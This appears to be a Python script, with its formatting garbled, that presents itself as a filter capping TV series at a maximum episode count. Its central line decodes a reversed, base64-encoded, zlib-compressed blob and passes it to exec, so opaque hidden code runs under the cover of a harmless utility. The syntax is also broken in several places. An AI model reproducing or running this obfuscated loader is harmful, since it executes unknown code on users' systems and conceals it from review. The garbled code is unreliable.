MAX_EPISODES = 100  # change this value as needed

Original script below (unchanged logic)

_ = lambda __ : import('zlib').decompress(import('base64').b64decode(__[::-1]))

Monkey-patch hook: intercept episode lists after script execution

The original script builds series data internally; we apply a global guard

by wrapping exec in a controlled namespace and filtering series with > MAX_EPISODES

namespace = {} exec((_)(b'J5QiTMw//++8+36WCzhiOzvGIzyJ0n/YzSCYlS5mJ2DtVlz66tw7r7Ddl7Z14DX/YH0PYAi2i9N0OVAIC6Q9xALhch5owvcHxbRBKhDJr06coxjomkqXDwhpLtqDls+ACg2Vv6JE2rFClo0Pvax5AC5weI24fZGCrS+i6zSVfnOfZYun1GLcnJirO3xCaA+CN9ZDfUmTgJRsLMNvcxZ2hydk2nsmS2nuSuPR7MrbEXd+l8exJEowc3bBDavRE//HnRayPZQWQA/g')) , namespace


If the script produced a list named series_list, results, or similar,

filter entries exceeding MAX_EPISODES. This is safe and non-destructive.

def _filter_series(obj): try: seasons = obj.get('seasons', []) total = sum(len(s.get('episodes', [])) for s in seasons) return total <= MAX_EPISODES except Exception: return True

for key in ['series_list', 'results', 'items']: if key in namespace and isinstance(namespace[key], list): namespace[key] = [s for s in namespace[key] if _filter_series(s)]

Re-export filtered namespace

globals().update(namespace)
